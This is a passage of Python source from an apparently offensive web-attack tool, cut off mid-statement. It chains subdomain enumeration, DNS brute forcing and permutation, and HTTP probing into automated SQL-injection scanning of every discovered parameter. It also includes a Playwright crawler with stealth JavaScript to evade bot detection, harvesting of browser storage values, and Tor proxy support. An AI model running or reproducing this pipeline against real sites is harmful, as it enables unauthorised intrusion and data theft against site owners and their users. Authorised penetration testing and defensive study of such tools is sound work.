class PermutationEngine:
    """
    Generates subdomain permutations from known subdomains to find hidden ones.
    Strategies:
      1. Prefix/suffix: dev-api, api-dev, api2, api-prod
      2. Numeric increment: app1app2, app3, ...
      3. Environment swaps: proddevstagingtestuat
      4. Region swaps: useuapcauk
      5. TLD-aware: strip .com, permute, re-add
      6. Compound: combine two known subdomains
      7. Hyphen/dot variations: api.v1  api-v1  apiv1
    """

    PREFIXES = ["dev","stg","stage","staging","prod","uat","qa","test","int",
                "preprod","alpha","beta","demo","sandbox","new","old","legacy",
                "v1","v2","v3","backup","temp","tmp","internal","ext","external",
                "us","eu","ap","uk","ca","de","fr","jp","sg","au","in","br",
                "east","west","north","south","central","primary","secondary",
                "master","worker","node","lb","gw","proxy","cdn","edge","core",
                "admin","api","web","app","mobile","m","www","static","media"]

    SUFFIXES = PREFIXES  # symmetric

    ENV_SYNONYMS = {
        "prod":     ["production","live","release","prd"],
        "dev":      ["development","develop","devel","dvl"],
        "staging":  ["stage","stg","stag","preprod","pre"],
        "test":     ["testing","qa","qat","tst"],
        "uat":      ["acceptance","uat","demo"],
        "alpha":    ["a","preview","canary"],
        "beta":     ["b","preview","rc"],
    }

    REGIONS = {
        "us":  ["us-east","us-west","us-east-1","us-west-2","use1","usw2"],
        "eu":  ["eu-west","eu-central","ew1","ec1","europe"],
        "ap":  ["ap-southeast","ap-northeast","apse1","apne1","asia"],
        "uk":  ["gb","london","lon"],
        "de":  ["frankfurt","fra","germany"],
        "au":  ["sydney","syd","australia"],
        "jp":  ["tokyo","tok","japan"],
        "sg":  ["singapore","sin","apac"],
    }

    def generate(self, known_subs: Set[str], domain: str,
                 max_results: int = 50000) -> Set[str]:
        """Generate permutations from known subdomains."""
        result: Set[str] = set()
        base_labels = {sub.replace(f".{domain}","")
                       for sub in known_subs if sub.endswith(f".{domain}")}

        for label in base_labels:
            # Strategy 1: Prefix/suffix addition
            for p in self.PREFIXES[:30]:
                result.add(f"{p}-{label}.{domain}")
                result.add(f"{label}-{p}.{domain}")
                result.add(f"{p}.{label}.{domain}")
                result.add(f"{label}.{p}.{domain}")
                result.add(f"{p}{label}.{domain}")
                result.add(f"{label}{p}.{domain}")

            # Strategy 2: Numeric increment
            num_m = re.search(r'(\d+)$', label)
            if num_m:
                base_no_num = label[:num_m.start()]
                n = int(num_m.group(1))
                for delta in range(1, 6):
                    result.add(f"{base_no_num}{n+delta}.{domain}")
                    result.add(f"{base_no_num}{max(0,n-delta)}.{domain}")
            else:
                for n in range(1, 5):
                    result.add(f"{label}{n}.{domain}")
                    result.add(f"{label}-{n}.{domain}")
                    result.add(f"{label}0{n}.{domain}")

            # Strategy 3: Environment swaps
            for env, synonyms in self.ENV_SYNONYMS.items():
                if env in label:
                    for syn in synonyms:
                        result.add(label.replace(env, syn, 1) + f".{domain}")
                for syn in synonyms:
                    if syn in label:
                        result.add(label.replace(syn, env, 1) + f".{domain}")
                        for other_syn in synonyms:
                            if other_syn != syn:
                                result.add(label.replace(syn, other_syn, 1) + f".{domain}")

            # Strategy 4: Region swaps
            for region, variants in self.REGIONS.items():
                all_region_variants = [region] + variants
                for v in all_region_variants:
                    if v in label:
                        for other in all_region_variants:
                            if other != v:
                                result.add(label.replace(v, other, 1) + f".{domain}")

            # Strategy 5: Hyphen/dot/no-separator variants
            if "-" in label:
                result.add(label.replace("-",".",1) + f".{domain}")
                result.add(label.replace("-","") + f".{domain}")
            if "." in label:
                result.add(label.replace(".","") + f".{domain}")
                result.add(label.replace(".","-",1) + f".{domain}")

        # Strategy 6: Wordlist  known labels compound
        for label in list(base_labels)[:20]:
            for word in self.PREFIXES[:20]:
                result.add(f"{word}-{label}.{domain}")
                result.add(f"{label}-{word}.{domain}")

        # Remove known ones, cap size
        result -= known_subs
        result = {r for r in result if self._is_valid(r, domain)}
        return set(list(result)[:max_results])

    @staticmethod
    def _is_valid(sub: str, domain: str) -> bool:
        if not sub.endswith(f".{domain}"): return False
        label = sub.replace(f".{domain}","")
        return bool(label) and bool(re.match(r'^[a-z0-9][a-z0-9\-\.]*[a-z0-9]$', label))


class DNSBruteForcer:
    """
    High-speed async DNS brute forcer:
      - Uses built-in wordlist + custom wordlist
      - Concurrent DNS resolution (configurable concurrency)
      - Wildcard detection (skips domains with wildcard DNS)
      - Resolves A, AAAA, CNAME records
      - Live subdomain output as found
    """

    RESOLVERS = [
        "8.8.8.8","8.8.4.4",          # Google
        "1.1.1.1","1.0.0.1",           # Cloudflare
        "9.9.9.9","149.112.112.112",   # Quad9
        "208.67.222.222","208.67.220.220",  # OpenDNS
        "64.6.64.6","64.6.65.6",       # Verisign
        "77.88.8.8","77.88.8.1",       # Yandex
        "185.228.168.9","185.228.169.9",   # CleanBrowsing
    ]

    def __init__(self, concurrency: int = 100, resolvers: List[str] = None,
                 wordlist_path: str = None):
        self.concurrency   = concurrency
        self.resolvers     = resolvers or self.RESOLVERS
        self._wordlist     = list(DNS_WORDLIST_BUILTIN)
        self._resolver_idx = 0
        if wordlist_path:
            try:
                # TODO: Replace with aiofiles for async I/O
                with open(wordlist_path) as f:
                    self._wordlist.extend(line.strip() for line in f
                                         if line.strip() and not line.startswith("#"))
                LOG.info(f"DNS wordlist: {len(self._wordlist)} words total")
            except Exception as e:
                LOG.warning(f"Wordlist load failed: {e}")

    def _next_resolver(self) -> str:
        r = self.resolvers[self._resolver_idx % len(self.resolvers)]
        self._resolver_idx += 1
        return r

    async def _resolve(self, hostname: str) -> Optional[List[str]]:
        """Resolve hostname with hard 3s timeout."""
        # Try dnspython first (fast, per-query timeout)
        try:
            import dns.asyncresolver as _ar
            import dns.exception as _de
            resolver = _ar.Resolver()
            resolver.nameservers = [self._next_resolver()]
            resolver.timeout     = 2.0
            resolver.lifetime    = 3.0
            try:
                ans = await resolver.resolve(hostname, "A")
                return [str(r) for r in ans]
            except (_de.DNSException, Exception):
                return None
        except ImportError:
            pass
        # Fallback: socket.getaddrinfo wrapped in hard timeout
        import socket
        loop = asyncio.get_running_loop()  # FIX v16: use get_running_loop()  always safe inside async
        try:
            info = await asyncio.wait_for(
                loop.run_in_executor(
                    None,
                    lambda: socket.getaddrinfo(
                        hostname, None, socket.AF_INET,
                        socket.SOCK_STREAM)),
                timeout=3.0)
            return list({r[4][0] for r in info})
        except (asyncio.TimeoutError, OSError, Exception):
            return None

    async def _detect_wildcard(self, domain: str) -> Optional[str]:
        """Detect wildcard DNS  returns wildcard IP if present."""
        random_label = "sqr-" + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=12))
        ips = await self._resolve(f"{random_label}.{domain}")
        if ips:
            LOG.warning(f"Wildcard DNS detected for {domain}: {ips}")
            return ips[0]
        return None

    async def brute_force(self, domain: str,
                          extra_words: List[str] = None,
                          max_words: int = None) -> Dict[str, List[str]]:
        """
        Brute-force subdomains. Returns {subdomain: [ips]}.
        """
        words = list(dict.fromkeys(self._wordlist + (extra_words or [])))
        if max_words: words = words[:max_words]

        domain = domain[4:] if domain.startswith("www.") else domain
        LOG.info(f"DNS brute force: {domain} with {len(words)} words "
                 f"(concurrency={self.concurrency})")

        # Wildcard detection
        wildcard_ip = await self._detect_wildcard(domain)

        found:   Dict[str, List[str]] = {}
        done     = 0
        total    = len(words)
        q: asyncio.Queue = asyncio.Queue()
        for w in words:
            await q.put(w)

        async def _dns_worker():
            nonlocal done
            while True:
                try:
                    word = q.get_nowait()
                except asyncio.QueueEmpty:
                    break
                hostname = f"{word}.{domain}"
                ips = await self._resolve(hostname)
                done += 1
                # Live progress every 50 probes
                if done % 50 == 0 or done == total:
                    pct = done * 100 // total
                    bar = ("" * (pct // 5)).ljust(20)
                    LOG.info(f"  DNS [{bar}] {pct:3d}% "
                             f"{done}/{total} probed | "
                             f"{len(found)} found")
                if ips:
                    if wildcard_ip and all(ip == wildcard_ip for ip in ips):
                        continue  # wildcard hit  skip without recording
                    found[hostname] = ips
                    LOG.info(f"   FOUND: {hostname}  {ips}")
                # Note: no q.task_done() needed  workers drain via get_nowait()/QueueEmpty,
                # queue.join() is never called so task accounting is unnecessary.

        # Run workers  one per concurrency slot
        workers = [asyncio.create_task(_dns_worker())
                   for _ in range(min(self.concurrency, total))]
        # Timeout: budget 0.5s per word amortised across all concurrent workers,
        # with a 60-second floor so small wordlists still get reasonable time.
        timeout = max(60, int(total * 0.5 / max(self.concurrency, 1)) + 30)
        try:
            await asyncio.wait_for(
                asyncio.gather(*workers, return_exceptions=True),
                timeout=timeout)
        except (asyncio.TimeoutError, TimeoutError):
            LOG.warning(f"  DNS timeout after {timeout}s")
            for w in workers: w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

        LOG.info(f"DNS brute force complete: {len(found)} subdomains found")
        return found

    async def resolve_list(self, subdomains: Set[str]) -> Dict[str, List[str]]:
        """Resolve a pre-existing set of subdomains (from passive enum)."""
        found:  Dict[str, List[str]] = {}
        items   = list(subdomains)
        total   = len(items)
        done    = 0
        q: asyncio.Queue = asyncio.Queue()
        for s in items: await q.put(s)

        async def _worker():
            nonlocal done
            while True:
                try:
                    hostname = q.get_nowait()
                except asyncio.QueueEmpty:
                    break
                ips = await self._resolve(hostname)
                done += 1
                if done % 50 == 0 or done == total:
                    LOG.info(f"  DNS resolve: {done}/{total} | "
                             f"{len(found)} live")
                if ips:
                    found[hostname] = ips
                    LOG.info(f"   {hostname}  {ips[0]}")

        workers = [asyncio.create_task(_worker())
                   for _ in range(min(self.concurrency, total))]
        try:
            await asyncio.wait_for(
                asyncio.gather(*workers, return_exceptions=True),
                timeout=total * 4)
        except (asyncio.TimeoutError, TimeoutError):
            for w in workers: w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
        LOG.info(f"DNS resolution: {len(found)}/{total} live")
        return found


# 
# SUBDOMAIN ATTACK ORCHESTRATOR
# 

@dataclass
class SubdomainTarget:
    hostname:  str
    ips:       List[str]
    source:    str          # passive / brute / permutation
    alive:     bool = True
    http_url:  str  = ""
    https_url: str  = ""

class SubdomainAttackOrchestrator:
    """
    Full subdomain recon  SQL injection pipeline:
      1. Passive enumeration (50+ sources)
      2. DNS brute force (built-in wordlist + custom)
      3. Permutation engine on discovered subdomains
      4. DNS resolution of all candidates
      5. HTTP probe (detect live web servers)
      6. Crawl each live subdomain
      7. SQL injection scan each discovered endpoint
    """

    def __init__(self, engine: "HTTPEngine", config: "Config",
                 brute_forcer: DNSBruteForcer = None,
                 api_keys: Dict[str, str] = None):
        self.engine       = engine
        self.config       = config
        self.brute        = brute_forcer or DNSBruteForcer()
        self.passive      = PassiveSubdomainEnumerator(engine, config, api_keys)
        self.permutation  = PermutationEngine()
        self._all_subs:   Dict[str, SubdomainTarget] = {}
        # FIX: self.kb was never assigned but scan_all() uses it.
        self.kb = get_kb()

    async def discover_all(self, domain: str) -> List[SubdomainTarget]:
        """
        Full discovery pipeline. Returns alive subdomain targets.
        """
        LOG.info(f"Subdomain discovery: {domain}")

        # Phase 1: Passive
        passive_subs = await self.passive.enumerate(
            domain, max_sources=50, skip_keyed=True)
        LOG.info(f"Phase 1 passive: {len(passive_subs)} candidates")

        # Phase 2: DNS brute force
        brute_results = await self.brute.brute_force(domain)
        brute_subs    = set(brute_results.keys())
        LOG.info(f"Phase 2 brute: {len(brute_subs)} candidates")

        # Phase 3: Permutation on union of passive + brute
        all_known = passive_subs | brute_subs
        perms     = self.permutation.generate(all_known, domain, max_results=30000)
        LOG.info(f"Phase 3 permutation: {len(perms)} candidates")

        # Phase 4: Resolve passive + permutation candidates
        to_resolve = passive_subs | perms
        to_resolve -= brute_subs  # already resolved in brute phase
        resolved = await self.brute.resolve_list(to_resolve)

        # Merge all resolved hosts
        all_resolved: Dict[str, List[str]] = {}
        all_resolved.update(brute_results)
        all_resolved.update(resolved)

        # Phase 5: HTTP probe
        targets = await self._probe_http(all_resolved, domain)
        LOG.info(f"Phase 5 live HTTP: {len(targets)} targets")

        return targets

    async def _probe_http(self, resolved: Dict[str, List[str]],
                           domain: str) -> List[SubdomainTarget]:
        """Check which resolved subdomains serve HTTP/HTTPS."""
        live: List[SubdomainTarget] = []
        sem  = asyncio.Semaphore(20)

        async def probe(hostname: str, ips: List[str]):
            async with sem:
                t = SubdomainTarget(hostname=hostname, ips=ips, source="resolved")
                for scheme in ("https","http"):
                    url = f"{scheme}://{hostname}"
                    try:
                        fp = await self.engine.send("GET", url)
                        if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) < 600:
                            setattr(t, f"{scheme}_url", url)
                            t.alive = True
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed in probe: %s", _sqr_e)
                if t.http_url or t.https_url:
                    live.append(t)
                    LOG.debug(f"  Live: {hostname} {t.https_url or t.http_url}")

        await asyncio.gather(*[probe(h, ips) for h, ips in resolved.items()], return_exceptions=True)
        return live

    async def scan_all(self, targets: List[SubdomainTarget],
                       reporter: "Reporter", session: "ScanSession",
                       tamper_chain: List[str] = None) -> List[Dict]:
        """
        Crawl and SQL-scan each live subdomain target.
        Returns all confirmed findings across all subdomains.
        """
        all_confirmed: List[Dict] = []
        tamper_chain  = tamper_chain or []

        for i, target in enumerate(targets, 1):
            url = target.https_url or target.http_url
            if not url: continue

            LOG.info("")
            LOG.info("=" * 60)
            LOG.info(f"[{i}/{len(targets)}] Crawling + Scanning: {target.hostname}")
            LOG.info("=" * 60)

            # Crawl subdomain
            endpoints = []
            _pw_sub = None
            if getattr(self.config, "playwright", False):
                try:
                    _pw_sub = PlaywrightCrawler(self.config)
                    await _pw_sub.__aenter__()
                    _sub_cc = ComprehensiveCrawler(
                        self.engine, self.config,
                        KeywordExtractor(), _pw_sub)
                    endpoints = await _sub_cc.crawl(
                        url,
                        max_pages=getattr(self.config,"crawl_depth",100),
                        max_depth=getattr(self.config,"max_depth",5),
                        scope_host=target.hostname)
                    await _pw_sub.__aexit__(None,None,None)
                except Exception as _e:
                    LOG.debug(f"  PW crawl {target.hostname}: {_e}")
                    if _pw_sub:
                        try: await _pw_sub.__aexit__(None,None,None)
                        except Exception as _sqr_e:
                            LOG.debug("Suppressed in scan_all: %s", _sqr_e)
            if not endpoints:
                try:
                    _sc = ApplicationCrawler(self.engine, self.config)
                    endpoints = await _sc.crawl(
                        url,
                        max_pages=getattr(self.config,"crawl_depth",50),
                        max_depth=getattr(self.config,"max_depth",3),
                        scope_host=target.hostname)
                except Exception as _e:
                    LOG.debug(f"  Crawl {target.hostname}: {_e}")

            LOG.info(f"  Crawled: {len(endpoints)} injectable endpoints")
            if not endpoints:
                LOG.info("  No endpoints found  skipping")
                continue

            # SQLi cascade scan
            _sub_orch = UniversalScanOrchestrator(
                engine=self.engine, config=self.config,
                session=session, kb=self.kb,
                anomaly=AnomalyScorer(),
                tamper_chain=tamper_chain, waf_name="",
                llm_engine=None,
                scanner_ref=self)
            for ep in endpoints:
                ep_fmt = "json" if "json" in (ep.content_type or "") else "form"
                for param, orig_val in ep.params.items():
                    # Skip tracking/asset/template params
                    _spn = param.lower()
                    _spv = str(orig_val)
                    _spath = urlparse(ep.url).path
                    if (param in {"utm_source","utm_medium","utm_campaign","utm_content",
                                  "utm_term","utm_button","utm_page-url","utm_website",
                                  "utm_content-group","origin","ref","referrer",
                                  "gh_jid","fbclid","gclid","msclkid","ver"} or
                            _spn.startswith("utm_") or
                            "${" in param or "${" in _spv or "${" in _spath or
                            any(x in _spath for x in
                                ("/wp-content/","/wp-includes/","/static/",
                                 "/assets/","/dist/","/fonts/"))):
                        continue
                    print(f"[*] testing parameter {('path-injection' if param in ('__path__','path-injection') else param)!r} "
                          f"@ {urlparse(ep.url).path[:60]}")
                    try:
                        _ep_data2 = None
                        if ep.method in ("POST","PUT","PATCH") and ep.params:
                            _ep_data2 = "&".join(
                                f"{k}={v}" for k,v in ep.params.items())
                        _cr = await _sub_orch.scan_surface(
                            f"{ep.method}:{urlparse(ep.url).path}",
                            ep.method, ep.url, _ep_data2, ep_fmt,
                            {param: orig_val})
                        if _cr:
                            _det = _cr[0].detection
                            LOG.info(f"  [CONFIRMED] {param!r} INJECTABLE!")
                            LOG.info(f"    Host   : {target.hostname}")
                            LOG.info(f"    URL    : {ep.url[:80]}")
                            LOG.info(f"    Tech   : {_det.technique}")
                            LOG.info(f"    DBMS   : {_det.dbms or 'unknown'}")
                            LOG.info(f"    Conf   : {_det.confidence:.0%}")
                            LOG.info(f"    Payload: {_det.payload[:80]!r}")
                            all_confirmed.append({
                                "subdomain": target.hostname,
                                "param":     param,
                                "original":  orig_val,
                                "result":    _det,
                                "url":       ep.url,
                                "method":    ep.method,
                                "data_fmt":  ep_fmt,
                                "data":      _ep_data2,
                            })
                    except Exception as _e:
                        _param_display = 'path-injection' if param in ('__path__', 'path-injection') else param
                        LOG.warning(f"[!] scan error {_param_display!r} @ {target.hostname}: {_e}")
                        LOG.debug(f"  Scan error {param}: {_e}")

        LOG.info(f"Subdomain scan complete: {len(all_confirmed)} findings across {len(targets)} hosts")
        return all_confirmed


# 
# ENHANCED PLAYWRIGHT CRAWLER   full modern web app support
# 


# 
# PLAYWRIGHT CRAWLER   concurrent worker pool (ported from OOB tester v12)
# 


class PlaywrightCrawler:
    """
    Advanced concurrent Playwright crawler.

    Architecture:
      - asyncio.Queue BFS  one shared queue, N worker tasks
      - Workers drain the queue concurrently, each on its own page
      - Live progress: "Crawling example.com  342 pages in queue"
      - Adaptive: blocks heavy assets, only loads what's needed for link discovery

    Extracts from every page:
      HTML     <a href>, <form action>, <link href>, <button data-url>,
                <meta http-equiv=refresh>, <iframe src>, <script src>
      JS       fetch() / axios / XHR URLs, route definitions (React Router,
                Vue Router, Angular), Next.js __NEXT_DATA__, Nuxt __NUXT__,
                webpack chunk manifests, Redux/Zustand store API refs
      GraphQL  introspection queries, subscription endpoints, persisted queries
      REST     URL patterns in JS strings, OpenAPI refs in HTML comments
      SPA      history.pushState hooks, hash routing, dynamic imports
      Shadow   Shadow DOM <a> and <form> elements
      Storage  localStorage / sessionStorage API keys and tokens
      WebSocket  ws:// and wss:// endpoints
      Forms    all input names, textarea names, select names
    """

    #  JavaScript injected into every page 

    STEALTH_JS = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
    Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
    Object.defineProperty(navigator,'platform',{get:()=>'Win32'});
    Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});
    window.chrome={runtime:{},loadTimes:function(){},csi:function(){},app:{}};
    const _hs=history.pushState.bind(history);
    window.__SQR_ROUTES__=new Set();
    history.pushState=function(s,t,u){
        if(u) window.__SQR_ROUTES__.add(
            u.startsWith('http')?u:location.origin+(u.startsWith('/')?u:'/'+u));
        return _hs(s,t,u);
    };
    new MutationObserver(ms=>ms.forEach(m=>m.addedNodes.forEach(n=>{
        if(n.querySelectorAll) n.querySelectorAll('a[href]').forEach(
            a=>{if(a.href)window.__SQR_ROUTES__.add(a.href);});
    }))).observe(document.documentElement,{childList:true,subtree:true});
    """

    EXTRACT_JS = r"""
    (() => {
        const found = new Set();
        const text  = document.documentElement.innerHTML;

        // 1. All anchor + form + link hrefs
        document.querySelectorAll('a[href],link[href],area[href]').forEach(
            e=>e.href&&e.href.startsWith('http')&&found.add(e.href));
        document.querySelectorAll('form[action]').forEach(
            f=>f.action&&f.action.startsWith('http')&&found.add(f.action));

        // 2. data-* URL attributes (common in SPAs)
        document.querySelectorAll(
            '[data-url],[data-href],[data-action],[data-src],[data-endpoint]'
        ).forEach(e=>{
            ['data-url','data-href','data-action','data-src','data-endpoint'].forEach(a=>{
                const v=e.getAttribute(a);
                if(v&&(v.startsWith('http')||v.startsWith('/')))
                    found.add(v.startsWith('/')?location.origin+v:v);
            });
        });

        // 3. SPA route history
        if(window.__SQR_ROUTES__) window.__SQR_ROUTES__.forEach(u=>found.add(u));

        // 4. Next.js manifest
        if(window.__NEXT_DATA__){
            try{
                const d=window.__NEXT_DATA__;
                if(d.buildId) found.add(`/_next/static/${d.buildId}/_buildManifest.js`);
                if(d.page) found.add(location.origin+d.page);
            }catch(e){}
        }

        // 5. Nuxt
        if(window.__NUXT__){
            try{
                JSON.stringify(window.__NUXT__).match(/"(\/[^"]{2,150})"/g)
                    ?.forEach(m=>{const p=m.slice(1,-1);
                        if(p.startsWith('/'))found.add(location.origin+p);});
            }catch(e){}
        }

        // 6. Any state object with URLs
        ['__INITIAL_STATE__','__REDUX_STATE__','__APP_STATE__',
         '__PRELOADED_STATE__','__APOLLO_STATE__'].forEach(k=>{
            if(window[k]) try{
                JSON.stringify(window[k]).match(/"(https?:\/\/[^"]{5,200})"/g)
                    ?.forEach(m=>found.add(m.slice(1,-1)));
            }catch(e){}
        });

        // 7. Fetch / axios / XHR URLs from inline scripts
        const patterns=[
            /fetch\s*\(\s*['"`]([^'"`\s]{4,200})['"`]/g,
            /axios\s*\.\s*(?:get|post|put|patch|delete|request)\s*\(\s*['"`]([^'"`\s]{4,200})['"`]/g,
            /open\s*\(\s*['"`](?:GET|POST|PUT|DELETE)['"`]\s*,\s*['"`]([^'"`\s]{4,200})['"`]/g,
            /(?:url|endpoint|path|route|href|src|action)\s*[:=]\s*['"`]((?:\/|https?:\/\/)[^'"`\s<>]{3,150})['"`]/g,
        ];
        patterns.forEach(pat=>{
            let m,re=new RegExp(pat.source,pat.flags);
            while((m=re.exec(text))!==null){
                const u=m[m.length-1];
                if(u&&!u.includes('*')&&!u.includes('{')&&u.length>3)
                    found.add(u.startsWith('http')?u:location.origin+(u.startsWith('/')?u:'/'+u));
            }
        });

        // 8. GraphQL endpoints
        if(window.__APOLLO_CLIENT__||text.includes('graphql')||text.includes('GraphQL')){
            ['/graphql','/api/graphql','/query','/gql'].forEach(p=>
                found.add(location.origin+p));
        }

        // 9. Shadow DOM
        function walkShadow(root){
            root.querySelectorAll('*').forEach(el=>{
                if(el.shadowRoot) walkShadow(el.shadowRoot);
                if(el.href&&el.href.startsWith('http')) found.add(el.href);
                if(el.action&&el.action.startsWith('http')) found.add(el.action);
            });
        }
        try{walkShadow(document);}catch(e){}

        return [...found].filter(u=>u&&u.length>5&&u.length<500);
    })()
    """

    FORMS_JS = """
    (() => {
        const forms = [];
        document.querySelectorAll('form').forEach(f=>{
            const params={};
            f.querySelectorAll('input,textarea,select').forEach(el=>{
                const n=el.name||el.id;
                if(n&&el.type!=='hidden'&&el.type!=='submit'&&el.type!=='button')
                    params[n]=el.type==='email'?'test@example.com':
                               el.type==='number'?'1':'test';
            });
            if(Object.keys(params).length)
                forms.push({action:f.action||location.href,
                             method:(f.method||'GET').toUpperCase(),params});
        });
        return forms;
    })()
    """

    STORAGE_JS = """
    (()=>{const r={};
        try{for(let i=0;i<localStorage.length;i++){
            const k=localStorage.key(i);
            r['ls:'+k]=(localStorage.getItem(k)||'').substring(0,100);
        }}catch(e){}
        try{for(let i=0;i<sessionStorage.length;i++){
            const k=sessionStorage.key(i);
            r['ss:'+k]=(sessionStorage.getItem(k)||'').substring(0,100);
        }}catch(e){}
        return r;
    })()
    """

    def __init__(self, config: "Config", auth: "AuthManager" = None,
                 kw_extractor=None):
        self.config        = config
        self.auth          = auth
        self._kw_extractor = kw_extractor
        self._pw         = None
        self._br         = None
        self._ctx        = None
        self._intercepted: List["InterceptedRequest"] = []
        self._js_files:    Set[str]   = set()
        self._ws_frames:   List[Dict] = []
        self.concurrency = getattr(config, "crawler_workers", 1)
        self.timeout_ms  = max(getattr(config, "timeout", 30), 20) * 1000

    async def __aenter__(self):
        await self._launch()
        return self

    async def __aexit__(self, *_):
        for obj in [self._ctx, self._br, self._pw]:
            if obj:
                try: await obj.close()
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in __aexit__: %s", _sqr_e)

    async def _launch(self):
        try:
            from playwright.async_api import async_playwright
            self._pw = await async_playwright().start()
        except ImportError:
            raise ImportError("pip install playwright && playwright install chromium")

        proxy = None
        if self.config.proxy:  proxy = {"server": self.config.proxy}
        elif getattr(self.config,"tor",False): proxy = {"server":"socks5://127.0.0.1:9050"}

        self._br = await self._pw.chromium.launch(
            headless=True, proxy=proxy,
            args=["--no-sandbox","--disable-setuid-sandbox",
                  "--disable-blink-features=AutomationControlled",
                  "--disable-dev-shm-usage","--disable-gpu",
                  "--window-size=1440,900","--lang=en-US",
                  "--disable-background-timer-throttling",
                  "--disable-renderer-backgrounding",
                  "--ignore-certificate-errors"])

        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/124.0.0.0 Safari/537.36")
        if getattr(self.config,"randomize_ua",False):
            ua = random.choice(USER_AGENTS[:5])

        self._ctx = await self._br.new_context(
            user_agent=ua, ignore_https_errors=True,
            viewport={"width":1440,"height":900},
            java_script_enabled=True, locale="en-US",
            extra_http_headers={
                "Accept-Language": "en-US,en;q=0.9",
                "sec-ch-ua": '"Chromium";v="124","Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            })

        try:
            await asyncio.wait_for(
                self._ctx.add_init_script(self.STEALTH_JS), timeout=5)
        except Exception as _sqr_e:
            LOG.debug("Suppressed: %s", _sqr_e)

        if self.auth and getattr(self.auth,"_cookies",None):
            try:
                cks = [{"name":k,"value":v,
                        "url":self.config.url or "http://localhost"}
                       for k,v in self.auth._cookies.items()]
                await asyncio.wait_for(self._ctx.add_cookies(cks), timeout=5)
            except Exception as _sqr_e:
                LOG.debug("Suppressed: %s", _sqr_e)

        LOG.info(f"Playwright launched: {ua[:70]}")

    async def crawl(self, start_url: str,
                    max_pages: int = 200,
                    max_depth: int = 5,
                    scope_host: str = None) -> List["InterceptedRequest"]:
        """
        BFS crawl from start_url.  Reports: 'Crawling host.com  N pages in queue'
        """
        parsed    = urlparse(start_url)
        raw_scope = scope_host or parsed.netloc
        scope     = raw_scope[4:] if raw_scope.startswith("www.") else raw_scope
        base_org  = f"{parsed.scheme}://{parsed.netloc}"

        visited:  Set[str]   = set()
        queue:    asyncio.Queue = asyncio.Queue()
        await queue.put((start_url, 0))
        visited.add(self._norm(start_url))

        #  Network interception 
        def _in_scope(url: str) -> bool:
            h = urlparse(url).netloc
            return scope in h or h.endswith("." + scope)

        _JUNK_PARAMS = frozenset({
            "utm_source","utm_medium","utm_campaign","utm_content","utm_term",
            "utm_button","utm_page-url","utm_website","utm_content-group",
            "origin","ref","referrer","gh_jid","fbclid","gclid","msclkid",
            "ttclid","mc_cid","mc_eid","_ga","_gl","ver","s","v","cb","t",
        })
        _SKIP_PATHS = ("/wp-content/","/wp-includes/","/static/",
                       "/assets/","/dist/","/fonts/","/images/",
                       "/img/","/media/","/uploads/")

        async def _on_request(req):
            url = req.url
            if not _in_scope(url): return
            if req.resource_type in ("image","media","font","ping","stylesheet"): return
            _up = urlparse(url).path
            # Skip static asset paths
            if any(x in _up for x in _SKIP_PATHS): return
            params = ParameterParser.from_url(url)
            if req.post_data:
                try:
                    _, pp = ParameterParser.from_data(req.post_data)
                    params.update(pp)
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in _on_request: %s", _sqr_e)
            # Strip junk params: tracking, analytics, template literals
            params = {k: v for k, v in params.items()
                      if k not in _JUNK_PARAMS
                      and not k.lower().startswith("utm_")
                      and "${" not in k
                      and "${" not in str(v)}
            if not params:
                if re.search(r"/(?:api|v\d+|rest|graphql)/", _up):
                    _segs = [s for s in _up.split("/")
                             if s and re.match(r"^[\w\-]{1,60}$",s)
                             and not re.match(r"^v?\d+$",s)]
                    if _segs:
                        params = {f"p{i}":v for i,v in enumerate(_segs[-3:])}
            if not params: return  # nothing useful to test
            self._intercepted.append(InterceptedRequest(
                method=req.method, url=url,
                headers=dict(req.headers), body=req.post_data,
                resource_type=req.resource_type, params=params))
            if req.resource_type=="script" and url.endswith((".js",".mjs")):
                self._js_files.add(url)

        self._ctx.on("request", _on_request)

        #  Worker 
        LOG.info(f"  Workers: {self.concurrency} | Scope: {scope}")

        async def _worker(wid: int):
            try:
                page = await asyncio.wait_for(self._ctx.new_page(), timeout=15)
            except Exception as e:
                LOG.warning(f"  [W{wid}] new_page failed: {e}"); return

            # Block heavy assets to reduce CPU
            _BLOCK = {"image","media","font","stylesheet","manifest"}
            async def _route(route):
                try:
                    (await route.abort() if route.request.resource_type in _BLOCK
                     else await route.continue_())
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in _route: %s", _sqr_e)
            try:
                await asyncio.wait_for(page.route("**/*", _route), timeout=5)
            except Exception as _sqr_e:
                LOG.debug("Suppressed in _route: %s", _sqr_e)

            try:
                await asyncio.wait_for(
                    page.add_init_script(self.STEALTH_JS), timeout=5)
            except Exception as _sqr_e:
                LOG.debug("Suppressed in _route: %s", _sqr_e)

            while True:
                try:
                    url, depth = await asyncio.wait_for(queue.get(), timeout=6.0)
                except (asyncio.TimeoutError, TimeoutError):
                    break

                if len(visited) >= max_pages:
                    queue.task_done(); break

                # Skip non-HTML asset URLs
                _ext = url.split("?")[0].split(".")[-1].lower() if "." in url.split("/")[-1] else ""
                if _ext in {"png","jpg","jpeg","gif","svg","ico","webp","woff",
                            "woff2","ttf","eot","otf","mp4","mp3","pdf","zip",
                            "css","map","gz","br"}:
                    queue.task_done()
                    continue
                LOG.info(f"  Crawling {scope}  "
                         f"{queue.qsize()} pages in queue "
                         f"[{len(visited)}/{max_pages} done] "
                         f" {url[:70]}")

                new_links: List[str] = []
                try:
                    # Navigate  page.goto timeout is in milliseconds (Playwright API).
                    # asyncio.wait_for backstop is in seconds and deliberately set higher
                    # so the Playwright timeout (which fires first) delivers clean errors.
                    _goto_backstop_s = self.timeout_ms / 1000 + 15
                    try:
                        await asyncio.wait_for(
